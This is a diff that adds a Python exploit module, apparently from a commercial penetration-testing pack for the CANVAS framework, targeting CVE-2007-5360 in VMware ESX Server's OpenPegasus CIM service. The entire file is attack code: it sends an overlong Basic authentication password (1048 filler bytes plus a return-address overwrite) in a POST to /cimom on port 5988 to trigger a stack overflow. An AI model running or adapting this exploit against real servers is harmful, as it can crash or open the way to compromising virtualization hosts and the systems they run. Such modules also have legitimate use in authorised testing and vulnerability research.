@@ -1,0 +1,67 @@
+#!/usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+# system imports
+import sys
+
+if '.' not in sys.path:
+    sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from httplib import HTTPConnection, HTTPSConnection
+import base64
+
+NAME="VMware ESX Server OpenPegasus overflow"
+DESCRIPTION="VMware ESX Server OpenPegasus Stack Overflow Vulnerability"
+DOCUMENTATION={}
+DOCUMENTATION["Date public"] = "10/10/2007"
+DOCUMENTATION["CVE Name"] = "CVE-2007-5360"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5360"
+
+VERSION="0.1"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+PROPERTY['VENDOR'] = 'VMware'
+
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.name = NAME
+		self.host = ""
+		self.port = 5988
+
+	def getargs(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+
+	def run(self):
+		self.setInfo("%s (in progress)"%(NAME))
+		self.getargs()
+
+		request  = "A"*1048 
+		request += "\x42\x42\x42\x42"
+
+		auth = "Basic " + base64.b64encode("root:"+request)
+
+		cnx = HTTPConnection(self.host, self.port)
+		cnx.request("POST", "/cimom",None,{"Host":"%s:%d" % (self.host, self.port),"Authorization":auth})
+		cnx.close()
+
+		self.setInfo('Vulnerability triggered')
+		return 1
+
+if __name__ == '__main__':
+	print "Running CANVAS " + NAME + " version " + VERSION
+	app = theexploit()
+	ret = standard_callback_commandline(app)
+
